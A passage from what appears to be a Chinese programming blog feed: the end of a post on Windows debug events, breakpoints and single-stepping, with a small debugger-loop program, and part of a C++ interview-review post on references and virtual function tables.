title="调试事件的处理"></a>调试事件的处理</h1><p> 主要是通过捕获调试消息，调试消息程序会发送给调试器DbgkpSendApiMessage</p><p>调试事件采集函数：<br>&lt;1&gt; 创建进程、线程必经之路:<br>    PspUserThreadStartup<br>        DbgkCreateThread<br>            DbgkpSendApiMessage(x, x)<br>&lt;2&gt; 退出线程、进程必经之路：<br>    PspExitThread<br>        DbgkExitThread/DbgkExitProcess<br>            DbgkpSendApiMessage(x, x)<br>&lt;3&gt; 加载模块的必经之路：<br>    NtMapViewOfSection<br>        DbgkMapViewOfSection<br>            DbgkpSendApiMessage(x, x)<br>&lt;4&gt; 卸载模块的必经之路：<br>    NtUnMapViewOfSection<br>        DbgkUnMapViewOfSection<br>            DbgkpSendApiMessage(x, x)<br>&lt;5&gt; 异常的必经之路：<br>    KiDispatchException<br>        DbgkForwardException<br>            DbgkpSendApiMessage(x, x)</p><p>可以亲自验证下，以PspUserThreadStartup为例</p><p><img src="image-20201021141049947.png" alt="image-20201021141049947"></p><p><img src="image-20201021141114787.png" alt="image-20201021141114787"></p><p><img src="image-20201021141124962.png" alt="image-20201021141124962"></p><p>至于调试事件</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">DEBUG_EVENT</span> &#123;</span><br>  DWORD dwDebugEventCode;<br>  DWORD dwProcessId;<br>  DWORD dwThreadId;<br>  <span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br>    EXCEPTION_DEBUG_INFO Exception;<br>    CREATE_THREAD_DEBUG_INFO CreateThread;<br>    CREATE_PROCESS_DEBUG_INFO CreateProcessInfo;<br>    EXIT_THREAD_DEBUG_INFO ExitThread;<br>    EXIT_PROCESS_DEBUG_INFO ExitProcess;<br>    LOAD_DLL_DEBUG_INFO LoadDll;<br>    UNLOAD_DLL_DEBUG_INFO UnloadDll;<br>    OUTPUT_DEBUG_STRING_INFO DebugString;<br>    RIP_INFO RipInfo;<br>  &#125; u;<br>&#125; DEBUG_EVENT, <br> *LPDEBUG_EVENT<br></code></pre></td></tr></table></figure><p>dwDebugEventCode描述了调试事件的类型，总共有9类调试事件：</p><table><thead><tr><th>CREATE_PROCESS_DEBUG_EVENT</th><th>创建进程之后发送此类调试事件，这是调试器收到的第一个调试事件。</th></tr></thead><tbody><tr><td>CREATE_THREAD_DEBUG_EVENT</td><td>创建一个线程之后发送此类调试事件。</td></tr><tr><td>EXCEPTION_DEBUG_EVENT</td><td>发生异常时发送此类调试事件。</td></tr><tr><td>EXIT_PROCESS_DEBUG_EVENT</td><td>进程结束后发送此类调试事件。</td></tr><tr><td>EXIT_THREAD_DEBUG_EVENT</td><td>一个线程结束后发送此类调试事件。</td></tr><tr><td>LOAD_DLL_DEBUG_EVENT</td><td>装载一个DLL模块之后发送此类调试事件。</td></tr><tr><td>OUTPUT_DEBUG_STRING_EVENT</td><td>被调试进程调用OutputDebugString之类的函数时发送此类调试事件。</td></tr><tr><td>RIP_EVENT</td><td>发生系统调试错误时发送此类调试事件。</td></tr><tr><td>UNLOAD_DLL_DEBUG_EVENT</td><td>卸载一个DLL模块之后发送此类调试事件。</td></tr></tbody></table><p>下面是调试事件</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> _CRT_SECURE_NO_DEPRECATE</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    STARTUPINFO si = &#123; <span class="hljs-number">0</span> &#125;;<br>    si.cb = <span class="hljs-keyword">sizeof</span>(si);<br>    PROCESS_INFORMATION pi = &#123; <span class="hljs-number">0</span> &#125;;<br>    <span class="hljs-keyword">if</span> (CreateProcess(<span class="hljs-string">L&quot;C:\\Users\\A\\Desktop\\temp.exe&quot;</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, FALSE, DEBUG_ONLY_THIS_PROCESS | CREATE_NEW_CONSOLE, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, &amp;si, &amp;pi) == FALSE)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;create process failed\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>    &#125;<br>    BOOL waitEvent = TRUE;<br>    DEBUG_EVENT debugEvent;<br>    <span class="hljs-keyword">while</span> (waitEvent == TRUE &amp;&amp; WaitForDebugEvent(&amp;debugEvent, INFINITE)) &#123;<br><br>        <span class="hljs-keyword">switch</span> (debugEvent.dwDebugEventCode) &#123;<br><br>        <span class="hljs-keyword">case</span> CREATE_PROCESS_DEBUG_EVENT:<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;CREATE_PROCESS_DEBUG_EVENT\n&quot;</span>);<br>            <span class="hljs-keyword">break</span>;<br><br>        <span class="hljs-keyword">case</span> CREATE_THREAD_DEBUG_EVENT:<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;CREATE_THREAD_DEBUG_EVENT\n&quot;</span>);<br>            <span class="hljs-keyword">break</span>;<br><br>        <span class="hljs-keyword">case</span> EXCEPTION_DEBUG_EVENT:<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;EXCEPTION_DEBUG_EVENT\n&quot;</span>);<br>            <span class="hljs-keyword">break</span>;<br><br>        <span class="hljs-keyword">case</span> EXIT_PROCESS_DEBUG_EVENT:<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;EXIT_PROCESS_DEBUG_EVENT\n&quot;</span>);<br>            waitEvent = FALSE;<br>            <span class="hljs-keyword">break</span>;<br><br>        <span class="hljs-keyword">case</span> EXIT_THREAD_DEBUG_EVENT:<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;EXIT_THREAD_DEBUG_EVENT\n&quot;</span>);<br>            <span class="hljs-keyword">break</span>;<br><br>        <span class="hljs-keyword">case</span> LOAD_DLL_DEBUG_EVENT:<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;LOAD_DLL_DEBUG_EVENT\n&quot;</span>);<br>            <span class="hljs-keyword">break</span>;<br><br>        <span class="hljs-keyword">case</span> UNLOAD_DLL_DEBUG_EVENT:<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;UNLOAD_DLL_DEBUG_EVENT\n&quot;</span>);<br>            <span class="hljs-keyword">break</span>;<br><br>        <span class="hljs-keyword">case</span> OUTPUT_DEBUG_STRING_EVENT:<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;OUTPUT_DEBUG_STRING_EVENT\n&quot;</span>);<br>            <span class="hljs-keyword">break</span>;<br><br>        <span class="hljs-keyword">case</span> RIP_EVENT:<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;RIP_EVENT\n&quot;</span>);<br>            <span class="hljs-keyword">break</span>;<br><br>        <span class="hljs-keyword">default</span>:<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;unknown debug event\n&quot;</span>);<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (waitEvent == TRUE) &#123;<br>            ContinueDebugEvent(debugEvent.dwProcessId, debugEvent.dwThreadId, DBG_CONTINUE);<br>        &#125;<br>        <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>    CloseHandle(pi.hThread);<br>    CloseHandle(pi.hProcess);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="断点"><a href="#断点" class="headerlink" title="断点"></a>断点</h1><h2 id="软件断点"><a href="#软件断点" class="headerlink" title="软件断点"></a>软件断点</h2><p>这个比较简单，软件断点就是把目标机器码替换为0xcc int 3</p><p>这样就会触发异常发送给调试器，调试器进行处理。</p><p>这时一般都会输出当时ip多少还有各个寄存器的值，其实是利用GetThreadContext来获得</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c++">WINBASEAPI<br>BOOL<br>WINAPI<br>GetThreadContext(<br>    _In_ HANDLE hThread,<br>    _Inout_ LPCONTEXT lpContext<br>    );<br></code></pre></td></tr></table></figure><p>第一个参数是线程的句柄，第二个参数是指向CONTEXT结构的指针。要注意，调用该函数之前需要设置CONTEXT结构的ContextFlags字段，指明你想要获取哪部分寄存器的值。该字段的取值如下：</p><table><thead><tr><th>CONTEXT_CONTROL</th><th>获取EBP，EIP，CS，EFLAGS，ESP和SS寄存器的值。</th></tr></thead><tbody><tr><td>CONTEXT_INTEGER</td><td>获取EAX，EBX，ECX，EDX，ESI和EDI寄存器的值。</td></tr><tr><td>CONTEXT_SEGMENTS</td><td>获取DS，ES，FS和GS寄存器的值。</td></tr><tr><td>CONTEXT_FLOATING_POINT</td><td>获取有关浮点数寄存器的值。</td></tr><tr><td>CONTEXT_DEBUG_REGISTERS</td><td>获取DR0，DR1，DR2，DR3，DR6，DR7寄存器的值。</td></tr><tr><td>CONTEXT_FULL</td><td>等于CONTEXT_CONTROL | CONTEXT_INTEGER | CONTEXT_SEGMENTS</td></tr></tbody></table><p>当然在编写程序时还需要注意，断点断下后要让ip–</p><h2 id="内存断点"><a href="#内存断点" class="headerlink" title="内存断点"></a>内存断点</h2><p>内存断点和软件断点有些区别</p><p>但本质一样，都是通过触发异常然后发送给调试器来处理</p><p>主要是通过修改页属性，当访问该页时则会出现缺页异常然后发送调试事件，调试器接收到后进行处理</p><p>与软件断点不同的是，内存断点不需要ip–</p><h2 id="硬件断点"><a href="#硬件断点" class="headerlink" title="硬件断点"></a>硬件断点</h2><p>先看下调试寄存器</p><p><img src="image-20201023200313571.png" alt="image-20201023200313571"></p><p>设置硬件断点：</p><p>1、Dr0~3用于设置硬件断点，由于只有4个断点寄存器，所以最多<br>只能设置4个硬件调试断点。</p><p>2、Dr7是最重要的寄存器：</p><p>&lt;1&gt; L0/G0 ~ L3/G3：控制Dr0~Dr3是否有效，局部还是全局。<br>每次异常后，Lx都被清零,Gx不清零。</p><p>&lt;2&gt; 断点长度(LENx)：00(1字节)  01(2字节)  11(4字节)</p><p>&lt;3&gt; 断点类型(R/Wx)：00(执行断点)  01(写入断点) 11(访问断点)</p><p>处理硬件断点：</p><p>1、硬件调试断点产生的异常是 STATUS_SINGLE_STEP（单步异常）</p><p>2、B0~B3：哪个寄存器触发的异常</p><p>所以我们可以总结下</p><p>首先硬件断点有个数量限制那就是4个，还有就是与内存断点和软件断点不同的是，硬件断点是通过单步异常来触发</p><h1 id="单步异常"><a href="#单步异常" class="headerlink" title="单步异常"></a>单步异常</h1><p>之前硬件断点学习后对单步异常有个初步了解</p><p>首先单步异常的出现是因为有这个需求，调试的时候需要单步走查看变化，需要一直下断点触发异常，为了满足需求，现在只需要把TF置1</p><p><img src="image-20201023203441916.png" alt="image-20201023203441916"></p><p>这样每走一步就会触发单步异常</p><h1 id="单步步过"><a href="#单步步过" class="headerlink" title="单步步过"></a>单步步过</h1><p>问题:当出现call时，单步入和单步过的实现</p><p>单步过通过软件断点或者硬件断点来实现，通过计算当前指令长度然后下断点后直接跑</p><p>调试器一般都这么实现所以有时候没有跟进call，但是call的函数改变了返回值，导致程序跑飞</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>关于c++</title>
    <link href="/2020/10/04/%E5%85%B3%E4%BA%8Ec/"/>
    <url>/2020/10/04/%E5%85%B3%E4%BA%8Ec/</url>
    
    <content type="html"><![CDATA[<p>之前人人人面试的时候开了外放，嫖到了一波面试题，问了许多c++，正巧把一些常问的问题总结下，顺带复习一波</p><p>仅为面试复习用，具体内容参考&lt;&lt;c++反汇编与逆向分析技术揭秘&gt;&gt;，毕竟本人c++也不咋滴233。</p><a id="more"></a><h1 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h1><p>一般都会问引用和指针区别</p><p>这个很容易，引用本质上就是指针，都是一块内存放了某个变量的地址，至于为什么有引用主要是安全，但这个安全也只是针对编译来说的，引用不可修改而指针可以，本质上还是个指针只不过是编译器来维护。</p><h1 id="虚表"><a href="#虚表" class="headerlink" title="虚表"></a>虚表</h1><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> _CRT_SECURE_NO_DEPRECATE</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;tlhelp32.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;vector&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> <span class="hljs-built_in">std</span>;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Base</span></span><br><span class="hljs-class">&#123;</span><br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">Function_1</span><span class="hljs-params">()</span></span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Function_1...\n&quot;</span>);<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Function_2</span><span class="hljs-params">()</span></span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Function_2...\n&quot;</span>);<br>    &#125;<br>&#125;;<br><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    Base base;<br>    base.Function_1();<br>    base.Function_2();<br>    Base* p = &amp;base;<br>    p-&gt;Function_1();<br>    p-&gt;Function_2();<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>在分情况讨论虚表时先给个例子</p><p><img src="image-20201004111321286.png" alt="image-20201004111321286"></p><p>可见如果是通过对象调用的话是直接调用的</p><p>但如果是指针调用那就会涉及虚表，可以看到间接call，当然因为编译器版本问题可能有些出入。</p><p>再来个例子帮助更好理解虚表</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> _CRT_SECURE_NO_DEPRECATE</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;tlhelp32.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;vector&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> <span class="hljs-built_in">std</span>;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Base</span></span><br><span class="hljs-class">&#123;</span><br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-keyword">int</span> x;<br>    <span class="hljs-keyword">int</span> y;<br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Function_1</span><span class="hljs-params">()</span></span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Function_1...\n&quot;</span>);<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Function_2</span><span class="hljs-params">()</span></span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Function_2...\n&quot;</span>);<br>    &#125;<br>&#125;;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    Base base;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d&quot;</span>, <span class="hljs-keyword">sizeof</span>(base));<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>含有虚函数的类成员第一项是个指针指向虚表，虚表放的是各个虚函数地址，所以这边大小为12，即使定义6个虚函数大小还是12.</p><table><thead><tr><th></th><th></th><th></th><th align="left">虚函数表</th><th></th><th></th><th></th><th></th></tr></thead><tbody><tr><td>Base对象</td><td>0x123245</td><td>—&gt;</td><td align="left">0x123456</td><td></td><td>Function_1()</td><td></td><td></td></tr><tr><td></td><td>..</td><td></td><td align="left">0x123456</td><td></td><td>Function_2()</td><td></td><td></td></tr><tr><td></td><td>..</td><td></td><td align="left">0x123456</td><td></td><td>Function_3()</td><td></td><td></td></tr><tr><td></td><td>..</td><td></td><td align="left"></td><td></td><td></td><td></td><td></td></tr><tr><td></td><td>..</td><td></td><td align="left"></td><td></td><td></td><td></td><td></td></tr><tr><td></td><td>其他成员</td><td></td><td align="left"></td><td></td><td></td><td></td><td></td></tr><tr><td></td><td></td><td></td><td align="left"></td><td></td><td></td><td></td><td></td></tr></tbody></table><p>下面分几个情况讨论下</p><h2 id="单继承无覆盖"><a href="#单继承无覆盖" class="headerlink" title="单继承无覆盖"></a>单继承无覆盖</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> _CRT_SECURE_NO_DEPRECATE</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;tlhelp32.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;vector&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> <span class="hljs-built_in">std</span>;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Base</span></span><br><span class="hljs-class">&#123;</span><br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Function_1</span><span class="hljs-params">()</span></span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Base:Function_1...\n&quot;</span>);<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Function_2</span><span class="hljs-params">()</span></span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Base:Function_2...\n&quot;</span>);<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Function_3</span><span class="hljs-params">()</span></span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Base:Function_3...\n&quot;</span>);<br>    &#125;<br>&#125;;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Sub</span> :</span>Base<br>&#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Function_4</span><span class="hljs-params">()</span></span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Sub:Function_4...\n&quot;</span>);<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Function_5</span><span class="hljs-params">()</span></span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Sub:Function_5...\n&quot;</span>);<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Function_6</span><span class="hljs-params">()</span></span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Sub:Function_6...\n&quot;</span>);<br>    &#125;<br>&#125;;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>* argv[])</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-comment">//查看 Sub 的虚函数表</span><br>    Sub sub;<br><br>    <span class="hljs-comment">//对象的前四个字节就是虚函数表</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Sub 的虚函数表地址为：%x\n&quot;</span>, *(<span class="hljs-keyword">int</span>*)&amp;sub);<br><br>    <span class="hljs-comment">//通过函数指针调用函数，验证正确性</span><br>    <span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">void</span><span class="hljs-params">(*pFunction)</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span>;<br><br>    pFunction pFn;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">6</span>; i++)<br>    &#123;<br>        pFn = (pFunction) * ((<span class="hljs-keyword">int</span>*)(*(<span class="hljs-keyword">int</span>*)&amp;sub) + i);<br>        pFn();<br>    &#125;<br><br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><table><thead><tr><th></th><th></th><th></th><th>虚函数表</th><th></th><th></th><th></th></tr></thead><tbody><tr><td>Sub对象</td><td>0x123245</td><td>—&gt;</td><td>0x123456</td><td></td><td>Base:Function_1</td><td></td></tr><tr><td></td><td>..</td><td></td><td>0x123457</td><td></td><td>Base:Function_2</td><td></td></tr><tr><td></td><td>..</td><td></td><td>0x135466</td><td></td><td>Base:Function_3</td><td></td></tr><tr><td></td><td>..</td><td></td><td>0x135466</td><td></td><td>Sub:Function_4</td><td></td></tr><tr><td></td><td>..</td><td></td><td>0x135466</td><td></td><td>Sub:Function_5</td><td></td></tr><tr><td></td><td>其他成员</td><td></td><td>0x135466</td><td></td><td>Sub:Function_6</td><td></td></tr><tr><td></td><td></td><td></td><td>00000000</td><td></td><td></td><td></td></tr></tbody></table><h2 